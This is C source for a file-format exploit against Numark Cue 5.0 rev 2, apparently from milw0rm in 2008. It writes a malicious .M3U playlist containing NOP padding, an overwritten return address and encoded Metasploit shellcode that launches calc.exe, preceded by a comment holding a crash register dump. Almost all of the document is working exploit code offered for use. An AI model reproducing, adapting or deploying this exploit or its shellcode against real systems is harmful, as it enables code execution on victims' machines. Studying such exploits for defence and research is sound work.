/*Numark Cue 5.0 rev 2 Local .M3U File Stack Buffer Overflow
 This sploit Launches calc.exe .. classical buffer overflow ,a 500 byte buffer is causing the exeption.
 Tested on WinXP Pro sp3,compiled with DEv-C++ 4.9.9.2.
 
 After preparation:
 |Access violation when executing [58414158]|  
EAX 00000001
ECX 004C01B2 cue_tria.004C01B2
EDX 01030608
EBX 0309948D ASCII "I:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ESP 0013EC98 ASCII "eeeeeeeeeeeeeeeeeeeeeeeeeeeYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYr Of The Dog Again (2006)[T-Boyz]\13. DMX - Life be my Song.mp3.jpg"
EBP 00000000
ESI 016016E0
EDI 00000000
EIP 58414158
Geetz to my friends Gil-Dong,Marsu,Expanders,Str0ke,Razvan,Vlad and all the people that I 
 know...find me in Regie.
*/

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<windows.h>

#define OFFSET 549

//got this shellcode from metasploit
  char shellcode[]=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x37\x6a\x63"
"\x58\x30\x42\x30\x50\x42\x6b\x42\x41\x73\x41\x42\x32\x42\x41\x32"
"\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x38\x69\x69\x6c\x38"
"\x68\x41\x54\x77\x70\x57\x70\x75\x50\x6e\x6b\x41\x55\x55\x6c\x6e"
"\x6b\x43\x4c\x66\x65\x41\x68\x45\x51\x58\x6f\x4c\x4b\x50\x4f\x62"
"\x38\x6e\x6b\x41\x4f\x31\x30\x36\x61\x4a\x4b\x41\x59\x6c\x4b\x74"
"\x74\x6e\x6b\x44\x41\x4a\x4e\x47\x41\x4b\x70\x6f\x69\x6c\x6c\x4c"
"\x44\x4b\x70\x43\x44\x76\x67\x4b\x71\x4a\x6a\x66\x6d\x66\x61\x39"
"\x52\x5a\x4b\x4a\x54\x75\x6b\x62\x74\x56\x44\x73\x34\x41\x65\x4b"
"\x55\x4e\x6b\x73\x6f\x54\x64\x53\x31\x6a\x4b\x35\x36\x6c\x4b\x64"
"\x4c\x30\x4b\x6c\x4b\x73\x6f\x57\x6c\x75\x51\x6a\x4b\x6c\x4b\x37"
"\x6c\x6c\x4b\x77\x71\x68\x6b\x4c\x49\x71\x4c\x51\x34\x43\x34\x6b"
"\x73\x46\x51\x79\x50\x71\x74\x4c\x4b\x67\x30\x36\x50\x4c\x45\x4b"
"\x70\x62\x58\x74\x4c\x6c\x4b\x53\x70\x56\x6c\x4e\x6b\x34\x30\x47"
"\x6c\x4e\x4d\x6c\x4b\x70\x68\x37\x78\x58\x6b\x53\x39\x6c\x4b\x4f"
"\x70\x6c\x70\x53\x30\x43\x30\x73\x30\x6c\x4b\x42\x48\x77\x4c\x61"
"\x4f\x44\x71\x6b\x46\x73\x50\x72\x76\x6b\x39\x5a\x58\x6f\x73\x4f"
"\x30\x73\x4b\x56\x30\x31\x78\x61\x6e\x6a\x78\x4b\x52\x74\x33\x55"
"\x38\x4a\x38\x69\x6e\x6c\x4a\x54\x4e\x52\x77\x79\x6f\x79\x77\x42"
"\x43\x50\x61\x70\x6c\x41\x73\x64\x6e\x51\x75\x52\x58\x31\x75\x57"
"\x70\x63";


  char file_start[]=
"\x23\x56\x69\x72\x74\x75\x61\x6C\x44\x4A"
"\x20\x50\x6C\x61\x79\x6C\x69\x73\x74\x0D"
"\x0A\x23\x4D\x69\x78\x54\x79\x70\x65\x3D"
"\x53\x6D\x61\x72\x74\x0D\x0A\x49\x3A\x5C";


  char file_end[]=
"\x72\x20\x4F\x66\x20\x54\x68\x65\x20\x44"
"\x6F\x67\x20\x41\x67\x61\x69\x6E\x20\x28"
"\x32\x30\x30\x36\x29\x5B\x54\x2D\x42\x6F"
"\x79\x7A\x5D\x5C\x31\x33\x2E\x20\x44\x4D"
"\x58\x20\x2D\x20\x4C\x69\x66\x65\x20\x62"
"\x65\x20\x6D\x79\x20\x53\x6F\x6E\x67\x2E"
"\x6D\x70\x33\x0D\x0A\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00";

 int main(int argc, char *argv[])
 { FILE *y;
   unsigned char *buffer;
   unsigned int offset=0;
   unsigned int NEW_EIP=0x7C8369F0;
   
    if(argc<2) 
   {   
    printf("****************************************\n");
    printf("USAGE IS:");
             printf("FileName.m3u\n");  
    printf("Credits for finding the bug and sploit go to fl0 fl0w \n");
    printf("****************************************\n");    
    system("color 02");
    Sleep(2000); 
return 0;   
   }  
   
   if((y=fopen(argv[1],"wb"))==NULL)
   { printf("error"); 
     exit(0); 
   } 
   
   printf("************************************************************\n");
   printf("Numark Cue 5.0 rev 2 .M3U File Stack Buffer Overflow\n");
   printf("Credits for finding the bug and sploit go to fl0 fl0w \n");
   printf("File successfully buit,open with Numark Cue :)\n");
   printf("************************************************************\n"); 
   system("color 03");
   
   buffer=(unsigned char *)malloc(OFFSET+strlen(file_start)+strlen(file_end)+4+1+strlen(shellcode)+15);
   memset(buffer,0x90,OFFSET+strlen(file_start)+strlen(file_end)+4+1+strlen(shellcode)+15);
   memcpy(buffer,file_start,strlen(file_start));  offset=OFFSET;  
   memcpy(buffer+offset,&NEW_EIP,4);  offset+=4;
   offset+=15;
   memcpy(buffer+offset,shellcode,strlen(shellcode)); offset+=strlen(shellcode);
   memcpy(buffer+offset,file_end,strlen(file_end)); offset+=strlen(file_end);
   fprintf(y,"%s",buffer);
   
return 0;  
      }

// milw0rm.com [2008-09-06]
